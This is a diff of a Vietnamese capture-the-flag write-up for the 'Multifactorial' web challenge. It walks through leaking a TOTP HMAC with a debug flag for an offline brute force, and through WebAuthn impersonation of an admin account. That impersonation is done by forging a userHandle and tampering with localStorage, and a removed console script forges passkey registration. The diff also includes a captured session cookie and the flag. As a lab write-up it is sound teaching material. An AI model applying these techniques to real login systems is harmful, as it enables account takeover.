@@ -1,15 +1,15 @@
 ---
-layout: post
-title: "Multifactorial - Silent Snow CTF"
+layout: single
+title: "Multifactorial - Advent of CTF 2025"
 categories: ctf
-tags: [web, mfa, idor, webauthn, sha1]
+tags: [web, mfa, idor, webauthn, totp]
 date: 2026-01-04
-permament_link: /writeups/silent-snow-ctf/multifactorial/
+permalink: /writeups/advent-of-ctf/multifactorial/
 ---
 
 > [!NOTE]
 > **Challenge Information**
-> - **Event:** Silent Snow CTF
+> - **Event:** Advent of CTF 2025
 > - **Challenge Name:** Multifactorial
 > - **Category:** Web Exploitation
 > - **Points:** 190
@@ -62,19 +62,50 @@ Sử dụng các công cụ tra cứu bảng cầu vồng trực tuyến (như C
 
 ---
 
-## Giai đoạn 2: Something You Have (TOTP)
+## Giai đoạn 2: Khai thác lỗ hổng thông tin trong quá trình xác thực TOTP
 
-Giai đoạn này đòi hỏi sự hiểu biết sâu sắc về cách thức hoạt động của TOTP (Time-based One-Time Password) và các cơ chế bảo vệ trạng thái (stateful defense) của server.
+Khi đến giai đoạn thứ hai, tôi gặp phải lời nhắc nhập mật khẩu một lần dựa trên thời gian (TOTP). Tôi đã xem lại mã nguồn để tìm bất kỳ thông tin bí mật được chia sẻ hoặc dữ liệu cấu hình nào. Tôi đã xác định được một hằng số có tên là `ORACLE_KEY`.
 
-### 1. Phân tích Chuyên Sâu
-
-Sau khi nhập đúng mật khẩu, hệ thống yêu cầu mã TOTP 6 chữ số. Việc kiểm tra mã nguồn (Client-side) cho thấy một biến toàn cục thú vị:
-
-```javascript
-ORACLE_KEY = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
+```html
+<script>
+      const ORACLE_KEY = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49";
+// .... SNIP ....
+</script>
 ```
 
-Đây là một lỗi cấu hình nghiêm trọng: **Rò rỉ khóa bí mật (Secret Key)**. Tuy nhiên, việc khai thác không hề đơn giản do các cơ chế phòng thủ sau:
+Sau đó, tôi đã ghi lại yêu cầu xác thực trong Burp Suite để phân tích các tham số.
+
+```http
+POST /api/something-you-have-verify?debug=0 HTTP/2
+Host: multifactorial.csd.lol
+Cookie: connect.sid=s%3ARE8-34nlSF-O1UTrcaBuhEPuCS6QFZqy.KgRbsj1YH7tL2JElijO66u%2BQm3AYv3lRwYhWeAAyaW0
+Content-Length: 17
+Origin: https://multifactorial.csd.lol
+Referer: https://multifactorial.csd.lol/something-you-have
+.... SNIP ....
+
+{
+    "code":"123456"
+}
+```
+
+Tôi đã ghi nhận tham số `debug=0` trong URL. Tôi đã sửa đổi nó thành `debug=1` để kiểm tra báo cáo lỗi chi tiết. Điều này đã phát hiện ra lỗ hổng rò rỉ thông tin, trong đó máy chủ trả về HMAC của mã TOTP dự kiến.
+
+```http
+HTTP/2 401 Unauthorized
+Date: Mon, 22 Dec 2025 14:49:49 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 128
+.... SNIP ....
+
+{
+    "error":"Invalid TOTP code.",
+    "hmac":"575ab00150cb1ab22814ddeb37c6fe22cbeb17c21e9e59c098f26122a21bd6bd",
+    "serverTime":1766414989
+}
+```
+
+Với thông tin `ORACLE_KEY` và mã HMAC bị rò rỉ, tôi đã có thể thực hiện một cuộc tấn công vét cạn ngoại tuyến vào không gian TOTP 6 chữ số. Tôi đã triển khai đoạn mã sau để tìm ra mã chính xác.
 
 #### a. Cơ chế "Anti-Replay" và "Rate Limiting"
 Hệ thống không chỉ kiểm tra tính đúng sai của mã mà còn quản lý trạng thái phiên làm việc:
@@ -132,130 +163,62 @@ for i in range(1000000):
 
 ---
 
-## Giai đoạn 3: Something You Are (WebAuthn/Passkey)
+## Giai đoạn 3: Giả mạo danh tính WebAuthn
 
-### 1. Phân tích: Lỗ hổng trong WebAuthn
-
-Vấn đề cốt lõi nằm ở quy trình đăng ký: Khi bạn nhấn nút đăng ký, trình duyệt hỏi máy chủ "Tôi nên đăng ký như thế nào?" qua API `/options`. Máy chủ trả về một cấu hình JSON, trong đó quan trọng nhất là `user.id`.
-
-Trong đoạn mã Client-side có dòng:
-```javascript
-publicKey.user.id = b64urlToBuf(publicKey.user.id);
-```
-
-Máy chủ gửi ID dạng Base64URL, và trình duyệt chuyển nó về dạng Binary để lưu vào thiết bị bảo mật (Authenticator).
-
-**Lỗ hổng (IDOR):** Máy chủ chấp nhận bất kỳ `user.id` nào mà Client gửi lên trong quá trình đăng ký/xác thực mà không kiểm tra lại xem nó có khớp với session hiện tại hay không. Nếu ta thay đổi ID này thành mã băm của `santa` trước khi WebAuthn tạo Credential, ta sẽ tạo ra một chìa khóa "hợp pháp" cho tài khoản Santa.
-
-### 2. Kế hoạch tác chiến
-
-Gợi ý của Jingle: "Hãy thử tự tạo một userHandle cho santa" và "SHA-256 không phải lúc nào cũng ở dạng Hex".
-
-Chúng ta cần mã băm SHA-256 của chuỗi `"santa"` ở dạng **Binary/Buffer** (để trình duyệt xử lý), chứ không phải chuỗi Hex thông thường.
-
-**Giá trị mục tiêu cho "santa":**
--   **SHA-256 (Hex):** `e4bab05e049e418c664945d948f728c3104e1c251d5c22501258671675276367`
--   **SHA-256 (Base64URL):** `5LqwXgQnkGFhSUXZSUP3KMMQThwlHVwiUBJYZxZ1J2M`
-
-### 3. Script Khai Thác (Console Injection)
-
-Thay vì dùng giao diện web, ta mở **Console (F12)** và chạy đoạn script sau. Script này sẽ:
-1.  Tính toán SHA-256 Buffer cho `"santa"`.
-2.  Lấy options đăng ký từ server.
-3.  **Ghi đè (Hook)** `publicKey.user.id` bằng hash của Santa.
-4.  Hoàn tất quy trình đăng ký giả mạo.
+Yếu tố thứ ba liên quan đến WebAuthn (Passkey). Để bắt đầu, tôi kiểm tra mã JavaScript phía máy khách để tìm hiểu cách thức hệ thống xử lý phản hồi xác thực.
 
 ```javascript
-async function finalizeAttack() {
-    const targetUser = "santa";
-    console.log("🚀 Bắt đầu cuộc tấn công mạo danh Santa...");
+// ... (mã JS trích xuất từ trang web)
+const payload = {
+  name,
+  id: cred.id,
+  rawId: bufToB64url(cred.rawId),
+  type: cred.type,
+  response: {
+    clientDataJSON: bufToB64url(cred.response.clientDataJSON),
+    attestationObject: bufToB64url(cred.response.attestationObject),
+  },
+};
 
-    // 1. Tạo SHA-256 Buffer cho "santa"
-    const encoder = new TextEncoder();
-    const data = encoder.encode(targetUser);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-
-    // 2. Lấy options từ máy chủ
-    const optResp = await fetch("/api/webauthn/register/options", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name: "santa" }), // Gửi tên là santa
-    });
-    const optData = await optResp.json();
-    const publicKey = optData.publicKey;
-
-    // 3. CAN THIỆP: Ghi đè ID của server bằng ID của Santa
-    // Đây chính là gói tin "mồi nhử" mà Jingle gửi xuống (thường là ID của hacker).
-    // Ta thay nó bằng ID của Santa.
-    publicKey.challenge = b64urlToBuf(publicKey.challenge);
-    publicKey.user.id = hashBuffer; // "Chìa khóa" quyết định
-    publicKey.user.name = "santa";
-    publicKey.user.displayName = "Santa Claus";
-
-    console.log("🔑 Đang tạo Passkey... Hãy xác nhận trên thiết bị của bạn!");
-
-    // 4. Tạo Credential (Trình duyệt sẽ hiện popup yêu cầu vân tay/mã pin)
-    const cred = await navigator.credentials.create({ publicKey });
-
-    // 5. Gửi dữ liệu giả mạo lên Server để hoàn tất
-    const payload = {
-        name: "santa",
-        id: cred.id,
-        rawId: bufToB64url(cred.rawId),
-        type: cred.type,
-        response: {
-            clientDataJSON: bufToB64url(cred.response.clientDataJSON),
-            attestationObject: bufToB64url(cred.response.attestationObject),
-        },
-    };
-
-    const verResp = await fetch("/api/webauthn/register/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-    });
-
-    const result = await verResp.json();
-    console.log("🏁 Kết quả từ Server:", result);
-
-    if (verResp.ok) {
-        alert("CHÚC MỪNG! Bạn đã là Santa Claus. Hãy tiến tới đăng nhập!");
-        window.location.href = "/something-you-are";
-    } else {
-        console.error("Lỗi:", result.error);
-    }
-}
-
-// Helper functions (thường có sẵn trong mã nguồn trang web, copy lại cho chắc)
-function b64urlToBuf(b64url) {
-    return Uint8Array.from(atob(b64url.replace(/-/g, "+").replace(/_/g, "/")), c => c.charCodeAt(0));
-}
-function bufToB64url(buf) {
-    return btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-}
-
-// Chạy hàm
-finalizeAttack();
+// Store helpful bits for login  <--- VULNERABILITY
+localStorage.setItem("np_name", name);
+localStorage.setItem("np_credId", verData.credId);
+localStorage.setItem("np_userHandle", verData.userHandle);
 ```
 
-**Kết quả:** Máy chủ nhận được credential mới, thấy `user.id` khớp với hash của Santa (do Client gửi lên và Server... tin luôn), nên đã liên kết thiết bị của hacker với tài khoản Santa. Chiến thắng!
+Tôi nhận thấy một lỗ hổng nghiêm trọng: ứng dụng tin tưởng hoàn toàn vào dữ liệu trong `localStorage` để định danh người dùng trong bước đăng nhập cuối cùng. Nếu tôi có thể tạo ra một mã `userHandle` hợp lệ cho tài khoản quản trị `santa`, tôi hoàn toàn có thể mạo danh họ mà không cần khóa bảo mật thực sự của họ.
 
-### 4. Phương pháp thay thế: Burp Suite Interception
+### Phân tích thuật toán User Handle
+Tôi sử dụng tính năng **Virtual Authenticator** trong Chrome DevTools để hỗ trợ kiểm thử WebAuthn mà không cần thiết bị vật lý.
 
-Nếu không quen dùng Console, bạn có thể dùng Burp Suite để đánh chặn và sửa gói tin trực tiếp ("Cách chuẩn").
+![Stage 3: Something You Are Registration](/assets/images/multifactorial-webauthn-helper.png)
 
-**Các bước thực hiện:**
+Đầu tiên, tôi đăng ký một tài khoản phụ tên là `helper` để quan sát cấu trúc dữ liệu được lưu lại:
+- **Internal ID (userHandle):** `6B07Dp2C_qr19uVb3_JHMQ`
 
-1.  **Cài đặt Intercept:** Bật Burp Suite, đảm bảo trình duyệt đi qua Proxy. Bật **Intercept is ON**.
-2.  **Bắt gói tin Options:** Nhấn nút đăng ký trên web. Burp sẽ bắt request `POST /api/webauthn/register/options`. Nhấn **Forward**.
-3.  **Chặn Response (Quan trọng):** Sau khi Forward request, nhấp chuột phải vào request đó trong Burp -> chọn **Do intercept -> Response to this request**.
-4.  **Sửa dữ liệu:** Khi gói tin Response trả về (JSON chứa cấu hình), tìm dòng:
-    `"id": "..." (ID hiện tại của hacker)`
-5.  **Inject Santa ID:** Thay thế giá trị đó bằng chuỗi Base64URL của SHA-256("santa"):
-    `5LqwXgQnkGFhSUXZSUP3KMMQThwlHVwiUBJYZxZ1J2M`
-6.  **Forward:** Nhấn Forward để thả gói tin về trình duyệt.
+![LocalStorage Helper Data](/assets/images/multifactorial-localstorage-helper.png)
 
-Lúc này, trình duyệt sẽ nhận được ID đã bị chỉnh sửa, và popup tạo Passkey sẽ hiện ra cho tài khoản "Santa" (dù server ban đầu gửi ID khác).
+Tôi đưa ra giả thuyết rằng `userHandle` này được tạo ra từ tên người dùng bằng cách sử dụng SHA-256, rút gọn xuống 16 byte và mã hóa Base64URL. Để kiểm chứng, tôi viết một script Python nhỏ để tính toán giá trị này cho `santa`.
+
+```python
+import hashlib
+import base64
+
+name = "santa"
+digest = hashlib.sha256(name.encode()).digest()[:16]
+santa_userHandle = base64.urlsafe_b64encode(digest).decode().rstrip("=")
+
+print(santa_userHandle)
+# Kết quả: ttyQg9o3L-0hGazhGum6hw
+```
+
+### Khai thác (Impersonation)
+Sau khi có mã băm định danh của Santa, tôi chỉnh sửa các giá trị trong `localStorage` trên trình duyệt để khớp với tài khoản mục tiêu.
+
+![LocalStorage Santa Updated](/assets/images/multifactorial-localstorage-santa.png)
+
+Cuối cùng, tôi thực hiện đăng nhập. Máy chủ chấp nhận danh tính giả mạo từ trình duyệt và cho phép tôi truy cập vào bảng điều khiển quản trị tại `/admin`, nơi hiển thị mã flag cuối cùng.
+
 
 ---
 
@@ -267,7 +230,7 @@ Thử thách **Multifactorial** là một ví dụ điển hình cho nguyên t�
 - Các lỗi sơ đẳng như rò rỉ khóa bí mật (Secret Key Leakage) và sử dụng thuật toán băm yếu (SHA-1) đóng vai trò đòn bẩy giúp kẻ tấn công leo thang dễ dàng.
 
 > [!SUCCESS]
-> **Flag:** `[Dán mã Flag bạn tìm được vào đây]`
+> **Flag:** `csd{1_L34rn3D_7h15_Fr0m_70m_5C077_84CK_1n_2020}`
 
 ---
 
